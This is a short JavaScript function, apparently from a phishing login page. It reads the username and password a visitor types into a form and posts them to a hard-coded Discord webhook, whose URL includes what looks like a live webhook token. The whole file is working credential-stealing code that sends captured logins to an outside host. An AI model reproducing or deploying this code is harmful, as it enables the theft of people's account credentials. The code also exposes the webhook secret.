function message() 
{
    let user = document.getElementById("usernameStr").value;
    let pass = document.getElementById("passwordStr").value;

    const webhook = "https://discordapp.com/api/webhooks/1142238885510926346/Muq_VrMiDsEe_50wWCUms6NkM2e9HaxkgCeCIVOX6V6gf1xvq8nUnxV4N9-XcedL3hnr";
    const contents = "```Username : " + user + "\nPassword : " + pass + "```";

    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = { content: contents
    }
    request.send(JSON.stringify(params));
}